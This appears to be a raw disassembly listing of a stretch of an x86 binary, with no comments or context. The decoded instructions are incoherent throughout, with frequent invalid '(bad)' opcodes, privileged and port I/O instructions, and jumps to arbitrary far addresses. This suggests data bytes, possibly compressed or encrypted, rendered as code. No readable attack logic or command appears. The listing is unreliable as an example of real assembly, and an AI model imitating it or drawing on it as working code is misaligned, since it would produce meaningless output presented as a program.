  40f5ee:	mov    bh,BYTE PTR [eax]
  40f5f0:	and    eax,ebx
  40f5f2:	mov    ebx,0x22ff6fcd
  40f5f7:	adc    edi,DWORD PTR [ecx-0x24]
  40f5fa:	fbstp  TBYTE PTR [esi-0xb]
  40f5fd:	or     al,0x9a
  40f5ff:	sub    BYTE PTR ds:0x76e7b9de,cl
  40f605:	stc    
  40f606:	and    BYTE PTR [esi+0x189c6b75],dh
  40f60c:	xchg   esp,eax
  40f60d:	or     eax,0x52ffafd1
  40f612:	outs   dx,DWORD PTR ds:[esi]
  40f613:	mov    eax,0xf4a50b2e
  40f618:	pop    ecx
  40f619:	jg     0x40f63d
  40f61b:	cmp    DWORD PTR [edx-0x40],eax
  40f61e:	inc    esi
  40f61f:	iret   
  40f620:	mov    BYTE PTR [ecx+edi*4-0x23],ch
  40f624:	cmc    
  40f625:	mov    ss,WORD PTR [edi+eax*1]
  40f628:	adc    BYTE PTR [ecx],bl
  40f62a:	inc    edi
  40f62b:	push   0x41
  40f62d:	cmp    dl,ch
  40f62f:	sbb    WORD PTR [esi-0x74],bp
  40f633:	or     edx,DWORD PTR [esi]
  40f635:	dec    esi
  40f636:	outs   dx,DWORD PTR ds:[esi]
  40f637:	into   
  40f638:	in     al,dx
  40f639:	lea    ebp,[eax+0x1f]
  40f63c:	or     esp,ecx
  40f63e:	or     esi,DWORD PTR [eax]
  40f640:	std    
  40f641:	jle    0x40f64f
  40f643:	rcr    DWORD PTR [ebp-0x74126286],cl
  40f649:	pop    edi
  40f64a:	stos   BYTE PTR es:[edi],al
  40f64b:	xor    ebp,0xffffffd6
  40f64e:	pop    ebp
  40f64f:	enter  0x6bc2,0xf4
  40f653:	and    ebx,DWORD PTR [eax+ebp*1+0x1]
  40f657:	cmp    ecx,esp
  40f659:	loop   0x40f67c
  40f65b:	and    al,0xcc
  40f65d:	pop    ss
  40f65e:	xor    eax,0x6e86ff85
  40f663:	push   esp
  40f664:	ins    BYTE PTR es:[edi],dx
  40f665:	mov    ds:0xd22aa39d,eax
  40f66a:	add    BYTE PTR [ebx-0x3edc4649],bh
  40f670:	or     BYTE PTR [eax],bh
  40f672:	sbb    eax,0x7642b687
  40f677:	(bad)  
  40f678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f679:	fild   QWORD PTR [ecx+0x3]
  40f67c:	jnp    0x40f664
  40f67e:	repz cwde 
  40f680:	sub    eax,0x71e37890
  40f685:	cmp    BYTE PTR [ebx-0x1e],al
  40f688:	stc    
  40f689:	test   eax,0x604b0834
  40f68e:	mov    eax,DWORD PTR [ecx+0x6a]
  40f691:	push   esi
  40f692:	jbe    0x40f692
  40f694:	mov    eax,ds:0xfbd4cedb
  40f699:	mov    ds:0x8931051f,al
  40f69e:	outs   dx,BYTE PTR ds:[esi]
  40f69f:	adc    DWORD PTR [eax+0x84fa256],ecx
  40f6a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6a6:	outs   dx,BYTE PTR ds:[esi]
  40f6a7:	and    al,0x35
  40f6a9:	data16 mov bl,0xfc
  40f6ac:	add    ebx,DWORD PTR [eax-0xa46deb8]
  40f6b2:	ins    DWORD PTR es:[edi],dx
  40f6b3:	xor    ebp,DWORD PTR [edi+0x72c06ec8]
  40f6b9:	mov    cl,0x66
  40f6bb:	dec    ebx
  40f6bc:	in     eax,0x1f
  40f6be:	jmp    0x40f6f9
  40f6c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6c1:	mov    ah,BYTE PTR [edx-0x7b25f46a]
  40f6c7:	push   eax
  40f6c8:	stos   BYTE PTR es:[edi],al
  40f6c9:	dec    esi
  40f6ca:	outs   dx,DWORD PTR ds:[esi]
  40f6cb:	retf   
  40f6cc:	retf   0x6b68
  40f6cf:	mov    gs,WORD PTR [edx]
  40f6d1:	jmp    0xeed3:0xf8fa3931
  40f6d8:	sbb    BYTE PTR [edx+0x3af56db9],0x32
  40f6df:	into   
  40f6e0:	cs cli 
  40f6e2:	std    
  40f6e3:	into   
  40f6e4:	fidivr WORD PTR [ebx]
  40f6e6:	mov    ebx,0x115ed2bb
  40f6eb:	adc    BYTE PTR [eax],al
  40f6ed:	scas   al,BYTE PTR es:[edi]
  40f6ee:	imul   edi,DWORD PTR [edx+ebp*2],0x369f13db
  40f6f5:	cdq    
  40f6f6:	scas   al,BYTE PTR es:[edi]
  40f6f7:	lock dec esi
  40f6f9:	xor    eax,0x18ba5e68
  40f6fe:	sbb    dl,BYTE PTR [esi]
  40f700:	ret    
  40f701:	cmp    esi,DWORD PTR [edi]
  40f703:	retf   0x71c
  40f706:	cwde   
  40f707:	lahf   
  40f708:	cmc    
  40f709:	cli    
  40f70a:	loop   0x40f694
  40f70c:	into   
  40f70d:	test   cl,ch
  40f70f:	jle    0x40f6f1
  40f711:	cmp    dh,bl
  40f713:	sub    DWORD PTR [edx-0x26a52a43],edx
  40f719:	aaa    
  40f71a:	imul   edx,DWORD PTR [edi-0x53cbe5ac],0x5c97b843
  40f724:	adc    al,0x5a
  40f726:	(bad)  
  40f727:	xor    DWORD PTR [edi-0x7d],esi
  40f72a:	scas   eax,DWORD PTR es:[edi]
  40f72b:	jmp    0x3c94:0x106e1ea5
  40f732:	fmul   DWORD PTR [ebx+0x5c]
  40f735:	sbb    edi,DWORD PTR [edx]
  40f737:	mov    eax,0xf6450974
  40f73c:	xor    DWORD PTR [ebx],esi
  40f73e:	out    dx,al
  40f73f:	mov    bh,0x7a
  40f741:	stos   DWORD PTR es:[edi],eax
  40f742:	pop    eax
  40f743:	fcomi  st,st(5)
  40f745:	xchg   ecx,eax
  40f746:	daa    
  40f747:	iret   
  40f748:	mov    eax,0x5e7eea80
  40f74d:	sub    al,0xb8
  40f74f:	cmp    BYTE PTR [edi+0x54],cl
  40f752:	or     DWORD PTR [ecx+0x63],esp
  40f755:	jns    0x40f72d
  40f757:	imul   esi,ebp,0x36
  40f75a:	aaa    
  40f75b:	ror    BYTE PTR [ebx+0x34],0xc0
  40f75f:	sbb    eax,0x17143d09
  40f764:	push   ss
  40f765:	mov    eax,gs
  40f767:	fisubr DWORD PTR [ecx-0x48]
  40f76a:	push   esi
  40f76b:	mov    ch,0xf1
  40f76d:	inc    edx
  40f76e:	outs   dx,DWORD PTR ds:[esi]
  40f76f:	mov    cl,0xcb
  40f771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f772:	in     eax,dx
  40f773:	js     0x40f74d
  40f775:	adc    eax,0x55733874
  40f77a:	out    dx,eax
  40f77b:	jno    0x40f753
  40f77d:	or     bh,bl
  40f77f:	mov    al,ds:0x3c2d6ff7
  40f784:	aam    0xb0
  40f786:	push   ds
  40f787:	mov    ecx,0x6562dd8a
  40f78c:	les    edi,FWORD PTR [ebx]
  40f78e:	jl     0x40f775
  40f790:	mov    bh,0xad
  40f792:	pop    edi
  40f793:	test   eax,0x32dae9d8
  40f798:	jge    0x40f7b6
  40f79a:	jns    0x40f78a
  40f79c:	hlt    
  40f79d:	shr    DWORD PTR [esi-0x2c],0xd1
  40f7a1:	mov    ecx,0x9b1d324
  40f7a6:	ss stos DWORD PTR es:[edi],eax
  40f7a8:	add    DWORD PTR [edi+ebp*8+0x3e],0xffffffc1
  40f7ad:	ret    0xe9e5
  40f7b0:	cmc    
  40f7b1:	ins    BYTE PTR es:[edi],dx
  40f7b2:	cld    
  40f7b3:	jb     0x40f7ce
  40f7b5:	out    dx,al
  40f7b6:	xchg   edx,eax
  40f7b7:	popa   
  40f7b8:	fistp  QWORD PTR [ebx]
  40f7ba:	push   esp
  40f7bb:	adc    DWORD PTR [edi],0xffffff99
  40f7be:	imul   BYTE PTR [edi+eax*8+0x27]
  40f7c2:	outs   dx,DWORD PTR ds:[esi]
  40f7c3:	stos   BYTE PTR es:[edi],al
  40f7c4:	push   ebp
  40f7c5:	call   0xb9f1b397
  40f7ca:	or     eax,edx
  40f7cc:	mov    ebp,0x4aaf5207
  40f7d1:	clc    
  40f7d2:	outs   dx,DWORD PTR ds:[esi]
  40f7d3:	pop    esp
  40f7d4:	daa    
  40f7d5:	and    ch,dh
  40f7d7:	push   ds
  40f7d8:	jno    0x40f82a
  40f7da:	outs   dx,DWORD PTR ds:[esi]
  40f7db:	xchg   ebp,eax
  40f7dc:	xchg   edx,eax
  40f7dd:	scas   al,BYTE PTR es:[edi]
  40f7de:	loopne 0x40f76e
  40f7e0:	or     ebx,eax
  40f7e2:	cmp    DWORD PTR gs:[ebx],esp
  40f7e5:	popa   
  40f7e6:	retf   
  40f7e7:	popf   
  40f7e8:	sub    DWORD PTR [esp+ebp*1-0x67a80a26],esi
  40f7ef:	aaa    
  40f7f0:	or     dl,BYTE PTR [edx+0x387910fb]
  40f7f6:	stc    
  40f7f7:	mov    esi,0x8e640ab0
  40f7fc:	inc    edi
  40f7fd:	aam    0x7c
  40f7ff:	stos   DWORD PTR es:[edi],eax
  40f800:	mov    edx,edx
  40f802:	cmp    BYTE PTR es:[ebp+0x78],dh
  40f806:	jae    0x40f802
  40f808:	mov    ds:0x240111c0,al
  40f80d:	sub    eax,0x2a20d76f
  40f812:	add    BYTE PTR [ebx],ah
  40f814:	mov    al,ds:0x84116ef6
  40f819:	mov    dh,cl
  40f81b:	and    ch,ah
  40f81d:	xor    BYTE PTR [esi+0x38],0x10
  40f821:	bound  edi,QWORD PTR [ebx+0x1332fd1]
  40f827:	cmp    al,0xe7
  40f829:	hlt    
  40f82a:	stos   DWORD PTR es:[edi],eax
  40f82b:	call   0xe17e:0x3f618cf5
  40f832:	dec    esp
  40f833:	cmp    esp,edi
  40f835:	and    BYTE PTR [edx+0x11fb2ffe],0x9
  40f83c:	cmc    
  40f83d:	fnsave [edx+0x7d]
  40f840:	and    al,0x24
  40f842:	add    ebp,ebp
  40f844:	jp     0x40f87e
  40f846:	cwde   
  40f847:	cmp    eax,0x6ead9c29
  40f84c:	dec    ecx
  40f84d:	adc    eax,0xf5992d6e
  40f852:	fldenv [ecx+eax*1+0x33]
  40f857:	cmp    DWORD PTR [esi-0x35befbb6],ecx
  40f85d:	cld    
  40f85e:	jb     0x40f7e3
  40f860:	cmc    
  40f861:	mov    dh,0x31
  40f863:	sbb    dh,al
  40f865:	fisubr WORD PTR [ebp-0x31]
  40f868:	xor    DWORD PTR [eax+0x3d67534e],ebx
  40f86e:	or     eax,0xc64f2d0e
  40f873:	scas   eax,DWORD PTR es:[edi]
  40f874:	lea    edx,[esi+0x63]
  40f877:	xlat   BYTE PTR ds:[ebx]
  40f878:	cmc    
  40f879:	inc    esi
  40f87a:	push   0xff49f482
  40f87f:	push   ds
  40f880:	in     eax,0xe5
  40f882:	mov    dh,0xf5
  40f884:	cmc    
  40f885:	mov    eax,ds:0x844e3a58
  40f88a:	jae    0x40f8ac
  40f88c:	lock push edi
  40f88e:	lea    ecx,ds:0x38a3d83e
  40f894:	imul   eax,DWORD PTR [eax+0x7f7796be],0xfffffffc
  40f89b:	cmp    BYTE PTR [esi-0x5a],ah
  40f89e:	xchg   esp,eax
  40f89f:	mov    edi,0x6708a747
  40f8a4:	cmc    
  40f8a5:	hlt    
  40f8a6:	ins    BYTE PTR es:[edi],dx
  40f8a7:	add    bl,BYTE PTR [ecx+0x3f]
  40f8aa:	iret   
  40f8ab:	(bad)
  40f8af:	pop    ecx
  40f8b0:	sub    BYTE PTR [esi],dl
  40f8b2:	jge    0x40f86e
  40f8b4:	push   eax
  40f8b5:	scas   eax,DWORD PTR es:[edi]
  40f8b6:	outs   dx,BYTE PTR ds:[esi]
  40f8b7:	(bad)  
  40f8b8:	repnz mov dh,0xb0
  40f8bb:	sub    DWORD PTR [eax+ebp*8-0x503944c0],edx
  40f8c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c3:	cmp    BYTE PTR [esi+ecx*1+0x6f],cl
  40f8c7:	pop    ebx
  40f8c8:	and    eax,0xef1c3f10
  40f8cd:	popf   
  40f8ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8cf:	jbe    0x40f8ac
  40f8d1:	xchg   BYTE PTR [esi-0x1f],ch
  40f8d4:	sti    
  40f8d5:	sub    BYTE PTR [eax-0x7ac439a3],0x34
  40f8dc:	loopne 0x40f914
  40f8de:	push   edi
  40f8df:	add    BYTE PTR [esi-0x2e1f917d],al
  40f8e5:	sahf   
  40f8e6:	xchg   edi,eax
  40f8e7:	sub    eax,0x18565bc5
  40f8ec:	stos   BYTE PTR es:[edi],al
  40f8ed:	iret   
  40f8ee:	dec    ecx
  40f8ef:	loopne 0x40f8ea
  40f8f1:	cmp    eax,DWORD PTR [edi-0x20dfa123]
  40f8f7:	jbe    0x40f96a
  40f8f9:	push   esp
  40f8fa:	outs   dx,DWORD PTR ds:[esi]
  40f8fb:	add    eax,0x2cf988f0
  40f900:	icebp  
  40f901:	add    dl,dl
  40f903:	cmp    BYTE PTR [ebp-0x572a5c81],cl
  40f909:	mov    esp,0xa412020b
  40f90e:	inc    ecx
  40f90f:	mov    ch,0x23
  40f911:	cmp    al,BYTE PTR [ecx-0x67a82068]
  40f917:	sub    DWORD PTR [edi+0x38],eax
  40f91a:	mov    al,ds:0x1f5b2cda
  40f91f:	dec    esp
  40f920:	xchg   ecx,eax
  40f921:	mov    ds:0x583a4a7c,eax
  40f926:	iret   
  40f927:	mov    eax,0xebf1ab30
  40f92c:	mov    BYTE PTR [ebx],bh
  40f92e:	lahf   
  40f92f:	xchg   DWORD PTR [eax+0x7170e915],ebx
  40f935:	push   ds
  40f936:	jge    0x40f8d3
  40f938:	mov    ds:0xb938b3b6,al
  40f93d:	(bad)  
  40f93e:	jne    0x40f8e9
  40f940:	mov    ch,0x19
  40f942:	pop    ebp
  40f943:	imul   ebp,esi,0x253432b8
  40f949:	or     edx,DWORD PTR [edx+0x0]
  40f94c:	cmc    
  40f94d:	sahf   
  40f94e:	or     eax,0x121c203d
  40f953:	mov    ah,0xf6
  40f955:	push   cs
  40f956:	add    eax,0xd5387f6f
  40f95b:	dec    BYTE PTR [ebx+0x14]
  40f95e:	(bad)  
  40f95f:	(bad)  
  40f960:	imul   edx
  40f962:	cmp    edi,DWORD PTR [edi+eiz*1]
  40f965:	jb     0x40f9c2
  40f967:	jns    0x40f955
  40f969:	mov    esp,0x2171862
  40f96e:	xchg   DWORD PTR [edi-0x453cc45b],ebp
  40f974:	inc    esi
  40f975:	pusha  
  40f976:	push   ds
  40f977:	sbb    al,0xf5
  40f979:	adc    al,0x36
  40f97b:	in     eax,0x7f
  40f97d:	loope  0x40f9d8
  40f97f:	loope  0x40f9f6
  40f981:	cmp    BYTE PTR [edx+0x1a20979d],cl
  40f987:	inc    edi
  40f988:	rol    DWORD PTR [ebx],1
  40f98a:	outs   dx,BYTE PTR ds:[esi]
  40f98b:	sub    ecx,ebp
  40f98d:	jbe    0x40f917
  40f98f:	mov    cl,0xb1
  40f991:	inc    ebp
  40f992:	or     eax,0x5b30171b
  40f997:	cmp    DWORD PTR [ebp-0x40312232],edi
  40f99d:	scas   eax,DWORD PTR es:[edi]
  40f99e:	mov    ds:0x90700ab,al
  40f9a3:	pop    esp
  40f9a4:	ins    BYTE PTR es:[edi],dx
  40f9a5:	cld    
  40f9a6:	shl    DWORD PTR [ebx],1
  40f9a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9a9:	es inc ebp
  40f9ab:	pop    edx
  40f9ac:	or     bh,BYTE PTR [eax]
  40f9ae:	(bad)  
  40f9af:	sbb    ebp,DWORD PTR ds:0x224fc3fe
  40f9b5:	test   DWORD PTR [esi+0x72],ebp
  40f9b8:	addr16 inc ebx
  40f9ba:	(bad)  
  40f9bb:	inc    BYTE PTR [ebx-0x5a]
  40f9be:	adc    eax,0x403b80ce
  40f9c3:	add    eax,0x4ef0ad40
  40f9c8:	fsub   QWORD PTR [eax+0x6f]
  40f9cb:	ret    
  40f9cc:	in     eax,0x76
  40f9ce:	or     al,0x3c
  40f9d0:	mov    eax,ds:0x2633afe5
  40f9d5:	cmp    ecx,eax
  40f9d7:	(bad)  [edx+0x71]
  40f9da:	cmp    dh,al
  40f9dc:	stos   DWORD PTR es:[edi],eax
  40f9dd:	fdivr  QWORD PTR [edx+eax*8-0x43]
  40f9e1:	aam    0xbd
  40f9e3:	mov    BYTE PTR [ebp-0x7d],al
  40f9e6:	xchg   edx,eax
  40f9e7:	push   ebp
  40f9e8:	mov    esp,0xeff868af
  40f9ed:	mov    eax,ds:0x69a3f881
  40f9f2:	push   es
  40f9f3:	cmp    ebx,ecx
  40f9f5:	shr    dl,1
  40f9f7:	jo     0x40f9b8
  40f9f9:	js     0x40fa3c
  40f9fb:	sbb    al,ch
  40f9fd:	test   al,0x7e
  40f9ff:	and    eax,0x38686140
  40fa04:	daa    
  40fa05:	addr16 (bad) 
  40fa07:	repz test DWORD PTR [ecx],esp
  40fa0a:	or     DWORD PTR [eax-0xb],ebx
  40fa0d:	inc    ebp
  40fa0e:	mov    BYTE PTR [edi+0x35],bl
  40fa11:	and    eax,DWORD PTR [eax+0x2da1672b]
  40fa17:	sbb    esp,DWORD PTR [eax]
  40fa19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa1a:	aam    0xb8
  40fa1c:	test   eax,0xd6a10571
  40fa21:	mov    cl,0x48
  40fa23:	pop    eax
  40fa24:	neg    BYTE PTR [eax+0xd]
  40fa27:	dec    edi
  40fa28:	cs inc ecx
  40fa2a:	fisttp QWORD PTR [edi-0x27]
  40fa2d:	hlt    
  40fa2e:	jl     0x40fa4c
  40fa30:	mov    esp,0x993ed9d9
  40fa35:	bound  ecx,QWORD PTR [eax-0x46]
  40fa38:	aad    0x69
  40fa3a:	mov    eax,0xab12f553
  40fa3f:	jg     0x40fa6e
  40fa41:	ja     0x40f9dc
  40fa43:	in     eax,0x5d
  40fa45:	pop    es
  40fa46:	pop    edx
  40fa47:	push   esi
  40fa48:	lods   eax,DWORD PTR ds:[esi]
  40fa49:	cmp    esp,DWORD PTR [ebp-0x300d3d01]
  40fa4f:	je     0x40fa64
  40fa51:	cmp    ebx,DWORD PTR [edi-0x3efcca3e]
  40fa57:	push   esp
  40fa58:	fisub  DWORD PTR [eax]
  40fa5a:	xchg   edi,eax
  40fa5b:	ds (bad) 
  40fa5d:	jmp    0x40fa14
  40fa5f:	xor    ch,BYTE PTR [edi+ebp*1-0x31]
  40fa63:	pop    ebp
  40fa64:	pop    ebp
  40fa65:	rep outs dx,BYTE PTR ds:[esi]
  40fa67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa68:	retf   0xc09
  40fa6b:	sar    BYTE PTR [ecx+edx*2],1
  40fa6e:	pop    ebx
  40fa6f:	cmp    DWORD PTR [edx],eax
  40fa71:	inc    ecx
  40fa72:	adc    BYTE PTR [ecx+0x49c371f3],al
  40fa78:	cmc    
  40fa79:	jp     0x40fa59
  40fa7b:	enter  0x110b,0xcc
  40fa7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa80:	sbb    eax,0x4032f38
  40fa85:	shl    DWORD PTR [edx],1
  40fa87:	and    ebp,DWORD PTR [edi-0x3cfb8369]
  40fa8d:	mov    ds:0xf2469056,al
  40fa92:	fisubr WORD PTR [edx+eiz*2]
  40fa95:	xor    DWORD PTR [edi+0x40777d38],ebx
  40fa9b:	das    
  40fa9c:	mov    al,0x9a
  40fa9e:	ret    0xf540
  40faa1:	fadd   QWORD PTR [esi]
  40faa3:	mov    cl,0x39
  40faa5:	add    al,0x23
  40faa7:	out    0xb7,eax
  40faa9:	push   es
  40faaa:	dec    ebp
  40faab:	in     al,0xfa
  40faad:	cmp    dh,BYTE PTR [edi+0x58]
  40fab0:	mov    ebp,0x6f653bf1
  40fab5:	shr    DWORD PTR [esi-0x39],1
  40fab8:	mov    edi,0x4a826bac
  40fabd:	mov    dh,0x28
  40fabf:	cmp    DWORD PTR [eax+0x312c9fdd],edi
  40fac5:	mov    ebp,0x5c11cc80
  40faca:	mov    BYTE PTR [ebx-0x5340404b],bl
  40fad0:	xor    BYTE PTR [ecx+ebp*1],dl
  40fad3:	ds xchg ebx,eax
  40fad5:	aaa    
  40fad6:	inc    edi
  40fad7:	jns    0x40fb44
  40fad9:	adc    BYTE PTR [ecx+0x4b],cl
  40fadc:	dec    eax
  40fadd:	xor    DWORD PTR [esi],esi
  40fadf:	mov    eax,0x527666f4
  40fae4:	push   edi
  40fae5:	pop    edx
  40fae6:	daa    
  40fae7:	jmp    0x40e48301
  40faec:	fidivr WORD PTR [ebx]
  40faee:	repnz pop ds
  40faf0:	push   0x6dd1266b
  40faf5:	clc    
  40faf6:	outs   dx,BYTE PTR ds:[esi]
  40faf7:	imul   ebp,DWORD PTR [esi-0x7132a0a7],0x70387f81
  40fb01:	les    edx,FWORD PTR [eax+0x6be7680d]
  40fb07:	and    al,0x1
  40fb09:	or     DWORD PTR [eax-0x769c1f86],ebp
  40fb0f:	mov    eax,0x1d2ccd7f
  40fb14:	or     BYTE PTR [ebx+esi*1+0x2b3bca81],ch
  40fb1b:	pop    ecx
  40fb1c:	and    edx,DWORD PTR gs:[edi-0x6b529b07]
  40fb23:	fild   DWORD PTR [edx+edi*4+0x6e]
  40fb27:	fs xor eax,0xe4186de8
  40fb2d:	out    0xf,al
  40fb2f:	arpl   bp,si
  40fb31:	jg     0x40fb69
  40fb33:	icebp  
  40fb34:	mov    DWORD PTR [esp+ecx*2+0x70fff5f3],esi
  40fb3b:	adc    al,ah
  40fb3d:	enter  0xbba2,0xbb
  40fb41:	cmp    ebx,DWORD PTR [eax]
  40fb43:	xchg   edi,eax
  40fb44:	cld    
  40fb45:	int    0xec
  40fb47:	inc    ecx
  40fb48:	adc    DWORD PTR [edi+0x32d7b76e],esp
  40fb4e:	xchg   ecx,eax
  40fb4f:	idiv   eax
  40fb51:	sbb    BYTE PTR [ebp-0x21282ac8],bl
  40fb57:	inc    eax
  40fb58:	push   cs
  40fb59:	dec    ecx
  40fb5a:	jp     0x40fb86
  40fb5c:	jmp    0xea0d:0xcac9e7c2
  40fb63:	test   DWORD PTR [eax-0x15],ebp
  40fb66:	xchg   BYTE PTR [eax],bh
  40fb68:	jae    0x40fb3a
  40fb6a:	push   es
  40fb6b:	add    DWORD PTR gs:[ebp+0x5e],edx
  40fb6f:	xchg   ecx,eax
  40fb70:	jmp    0x8310:0x5cffafae
  40fb77:	mov    ah,0x35
  40fb79:	inc    edi
  40fb7a:	mov    esp,0x641aefac
  40fb7f:	ds (bad) 
  40fb81:	cmp    BYTE PTR [ebx+0x432a519e],cl
  40fb87:	into   
  40fb88:	or     ecx,DWORD PTR [esp+eiz*8+0x4]
  40fb8c:	cmc    
  40fb8d:	xor    DWORD PTR [edx+0x2ff1646e],edx
  40fb93:	xchg   ebp,eax
  40fb94:	daa    
  40fb95:	ss inc ebp
  40fb97:	and    eax,0xa00ee4c5
  40fb9c:	xor    al,0xf8
  40fb9e:	sub    DWORD PTR [eax+esi*2+0x285f6e8c],esi
  40fba5:	and    cl,0x93
  40fba8:	xchg   esi,esi
  40fbaa:	adc    al,0x47
  40fbac:	int    0x3b
  40fbae:	hlt    
  40fbaf:	out    0xe0,al
  40fbb1:	sbb    eax,0x30208228
  40fbb6:	fisttp WORD PTR [edi+eax*8]
  40fbb9:	jg     0x40fb49
  40fbbb:	fidivr DWORD PTR [eax-0x65]
  40fbbe:	cs (bad) 
  40fbc0:	rcr    BYTE PTR [esi],0xf0
  40fbc3:	inc    esi
  40fbc4:	adc    DWORD PTR [eax],edi
  40fbc6:	xchg   esi,eax
  40fbc7:	fdiv   DWORD PTR [ecx-0x7adf4a1e]
  40fbcd:	cmp    eax,0x8169928c
  40fbd2:	out    dx,eax
  40fbd3:	fwait
  40fbd4:	gs stos BYTE PTR es:[edi],al
  40fbd6:	ret    
  40fbd7:	add    al,0xdd
  40fbd9:	xchg   esi,eax
  40fbda:	lahf   
  40fbdb:	cmp    BYTE PTR [edi+0x4a],dl
  40fbde:	add    ah,ch
  40fbe0:	pop    esp
  40fbe1:	or     al,BYTE PTR [edx+0xb82f5af]
  40fbe7:	pop    ebp
  40fbe8:	or     ch,BYTE PTR [eax]
  40fbea:	mov    WORD PTR [edx],fs
  40fbec:	sar    BYTE PTR [ebx],0xbf
  40fbef:	scas   al,BYTE PTR es:[edi]
  40fbf0:	xchg   edx,eax
  40fbf1:	push   eax
  40fbf2:	clc    
  40fbf3:	add    BYTE PTR [eax-0x18],0x66
  40fbf7:	add    ch,dh
  40fbf9:	fs loop 0x40fb81
  40fbfc:	adc    al,0x80
  40fbfe:	sub    ebx,eax
  40fc00:	(bad)  
  40fc01:	and    al,0x37
  40fc03:	shr    ah,cl
  40fc05:	push   ds
  40fc06:	fdivr  QWORD PTR [edi]
  40fc08:	inc    edx
  40fc09:	cmp    BYTE PTR [ecx-0x63937984],ah
  40fc0f:	xchg   ebx,eax
  40fc10:	cmc    
  40fc11:	ret    
  40fc12:	scas   eax,DWORD PTR es:[edi]
  40fc13:	nop
  40fc14:	sbb    eax,0x8ed03f23
  40fc19:	cmp    edx,ebx
  40fc1b:	or     al,0xc5
  40fc1d:	inc    edi
  40fc1e:	push   edx
  40fc1f:	sub    eax,0x556e14e0
  40fc24:	xor    BYTE PTR [eax],0xe6
  40fc27:	stos   BYTE PTR es:[edi],al
  40fc28:	loope  0x40fc87
  40fc2a:	lds    edi,FWORD PTR [eax]
  40fc2c:	inc    eax
  40fc2d:	or     eax,0x78764c67
  40fc32:	cmp    eax,0x6ef5f9bd
  40fc37:	mov    ebx,DWORD PTR [edi-0x364d5792]
  40fc3d:	je     0x40fbc8
  40fc3f:	cmp    BYTE PTR [edx+esi*2],al
  40fc42:	out    0x93,eax
  40fc44:	pop    es
  40fc45:	sar    esi,1
  40fc47:	(bad)  
  40fc48:	cmc    
  40fc49:	leave  
  40fc4a:	xlat   BYTE PTR ds:[ebx]
  40fc4b:	mov    ch,0x35
  40fc4d:	lods   al,BYTE PTR ds:[esi]
  40fc4e:	inc    edx
  40fc4f:	js     0x40fc34
  40fc51:	cmp    BYTE PTR [ecx+0x55],ch
  40fc54:	mov    esi,0x29d46d70
  40fc59:	ret    0xab6f
  40fc5c:	jbe    0x40fc4c
  40fc5e:	bound  eax,QWORD PTR [ebx+0x2c2a8830]
  40fc64:	and    bh,BYTE PTR [eax]
  40fc66:	stos   DWORD PTR es:[edi],eax
  40fc67:	xchg   DWORD PTR [ecx+edi*4-0x17c93725],esp
  40fc6e:	outs   dx,DWORD PTR ds:[esi]
  40fc6f:	pop    esp
  40fc70:	fst    QWORD PTR [eax]
  40fc72:	mov    bh,BYTE PTR [ecx-0x529dc4b5]
  40fc78:	push   edx
  40fc79:	sar    BYTE PTR [ecx+0x39],0xf7
  40fc7d:	int    0xd7
  40fc7f:	mov    dl,0xfe
  40fc81:	xor    cl,BYTE PTR [esi+0x66]
  40fc84:	mov    ah,0xf0
  40fc86:	outs   dx,BYTE PTR ds:[esi]
  40fc87:	shl    edx,cl
  40fc89:	sbb    esp,edx
  40fc8b:	push   ecx
  40fc8c:	fs retf 0x38bf
  40fc90:	mov    es,WORD PTR [ebx+0x97456c9]
  40fc96:	fmul   QWORD PTR [esi]
  40fc98:	cmc    
  40fc99:	fidiv  DWORD PTR [eax+0x45350194]
  40fc9f:	scas   al,BYTE PTR es:[edi]
  40fca0:	or     eax,0xe38c2338
  40fca5:	inc    esp
  40fca6:	push   edi
  40fca7:	imul   esi,DWORD PTR [eax],0x2b436e0d
  40fcad:	popf   
  40fcae:	fdivr  st(6),st
  40fcb0:	dec    esp
  40fcb1:	jecxz  0x40fc6d
  40fcb3:	cmp    bh,ah
  40fcb5:	inc    esi
  40fcb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcb7:	(bad)  
  40fcb8:	maskmovq mm7,(bad)
  40fcb9:	idiv   DWORD PTR [edi+0x4bc9f5cb]
  40fcbf:	(bad)  
  40fcc0:	mov    edi,0x9f510b8b
  40fcc5:	xor    BYTE PTR [edx],dh
  40fcc7:	sysexit 
  40fcc9:	fs push ebp
  40fccb:	cmp    DWORD PTR [ecx+eiz*4+0xc],ecx
  40fccf:	or     ebp,esi
  40fcd1:	ins    BYTE PTR es:[edi],dx
  40fcd2:	mov    ds:0x8ec203cd,al
  40fcd7:	sbb    eax,DWORD PTR [ebx+edi*1-0x12431227]
  40fcde:	adc    eax,0x6f4daf74
  40fce3:	push   ecx
  40fce4:	sbb    DWORD PTR [eax+0x3c],0xffffffb0
  40fce8:	mov    eax,ds:0x5b3875ef
  40fced:	fiadd  WORD PTR [esi+0x3dcc7311]
  40fcf3:	imul   esi,ebp,0x586ac890
  40fcf9:	out    0x72,eax
  40fcfb:	fistp  WORD PTR [edx+eiz*8-0x75]
  40fcff:	inc    ebx
  40fd00:	jne    0x40fc8f
  40fd02:	inc    esi
  40fd03:	xchg   esp,eax
  40fd04:	rcl    cl,0x12
  40fd07:	jno    0x40fd83
  40fd09:	lods   al,BYTE PTR ds:[esi]
  40fd0a:	outs   dx,BYTE PTR ds:[esi]
  40fd0b:	inc    DWORD PTR [edx-0x62]
  40fd0e:	cmp    ch,BYTE PTR [ecx+0x39450e55]
  40fd14:	sbb    bh,BYTE PTR [esi-0x5c]
  40fd17:	pop    edx
  40fd18:	ss push esp
  40fd1a:	sbb    dh,BYTE PTR [eax+0x74]
  40fd1d:	pop    ecx
  40fd1e:	outs   dx,DWORD PTR ds:[esi]
  40fd1f:	adc    DWORD PTR [esi-0x1a],ecx
  40fd22:	adc    DWORD PTR [esi-0x1a],eax
  40fd25:	pop    ds
  40fd26:	fcomp  DWORD PTR [ebx]
  40fd28:	test   BYTE PTR [eax],ah
